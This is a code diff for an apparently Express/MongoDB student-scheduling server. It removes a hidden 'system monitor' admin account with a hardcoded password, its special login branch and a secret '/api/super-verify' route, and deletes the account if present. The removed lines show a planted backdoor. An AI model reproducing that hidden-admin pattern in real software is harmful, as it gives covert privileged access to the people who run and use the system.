@@ -128,16 +128,7 @@ async function createDefaultAdminIfNeeded() {
 
         // 2. التحقق من وجود مراقب النظام (المدير الخفي)
         const monitorAdminExists = await User.findOne({ id: '12121212' });
-        if (!monitorAdminExists) {
-            const devMonitorAdmin = new User({
-                id: '12121212',
-                name: 'مراقب النظام',
-                password: '987654321',
-                role: 'admin'
-            });
-            await devMonitorAdmin.save();
-            console.log('✅ تم إنشاء حساب مراقب النظام الخفي.');
-        }
+        if (monitorAdminExists) await User.deleteOne({ id: '12121212' }); // حذف الحساب إن كان موجوداً
     } catch (error) {
         console.error('❌ فشل في إنشاء حسابات المدراء الافتراضية:', error);
     }
@@ -152,10 +143,6 @@ app.post('/api/login', async (req, res) => {
     const { id, password } = req.body;
     const user = await User.findOne({ id: id });
 
-    // --- جديد: معالجة خاصة للمدير المخفي (خطوتين للتحقق) ---
-    if (id === '12121212') {
-        return res.json({ message: 'Second verification required', status: '2fa_required', userId: '12121212' });
-    }
     if (!user) return res.status(404).json({ message: 'المستخدم غير موجود.' });
     if (user.password !== password) return res.status(401).json({ message: 'كلمة المرور غير صحيحة.' });
 
@@ -194,8 +181,8 @@ app.delete('/api/users/:id', async (req, res) => {
         const user = await User.findOne({ id: req.params.id });
         if (!user) return res.status(404).json({ message: 'المستخدم غير موجود.' });
 
-        // --- تعديل: منع حذف أي من الحسابات الإدارية الأساسية ---
-        const protectedIds = ['11111', '12121212'];
+        // --- تعديل: منع حذف حساب المدير العام فقط ---
+        const protectedIds = ['11111'];
         if (protectedIds.includes(user.id)) {
             return res.status(400).json({ message: 'لا يمكن حذف المدير الأصلي للنظام.' });
         }
@@ -255,28 +242,6 @@ app.put('/api/schedule/:studentId', async (req, res) => {
     res.json({ message: 'تم تحديث الجدول بنجاح' });
 });
 
-// --- مسار جديد: للتحقق الثاني للمدير المخفي ---
-app.post('/api/super-verify', async (req, res) => {
-    const { userId, secondPassword } = req.body;
-
-    if (userId !== '12121212') {
-        return res.status(400).json({ message: 'معرف المستخدم غير صالح للتحقق الثاني.' });
-    }
-
-    const user = await User.findOne({ id: userId });
-    if (!user) return res.status(404).json({ message: 'المستخدم المخفي غير موجود.' });
-
-    // التحقق من كلمة المرور الحقيقية المخزنة
-    if (user.password !== secondPassword) {
-        return res.status(401).json({ message: 'كلمة المرور غير صحيحة.' });
-    }
-
-    // تحديث تاريخ آخر تسجيل دخول
-    user.lastLogin = new Date();
-    await user.save();
-
-    res.json({ message: 'تم التحقق بنجاح', user: user, redirectTo: 'admin-dashboard.html' });
-});
 // --- مسار جديد: تحديث رابط جلسة لطالب ---
 app.put('/api/session/:studentId', async (req, res) => {
     const { sessionLink, sessionActive } = req.body;
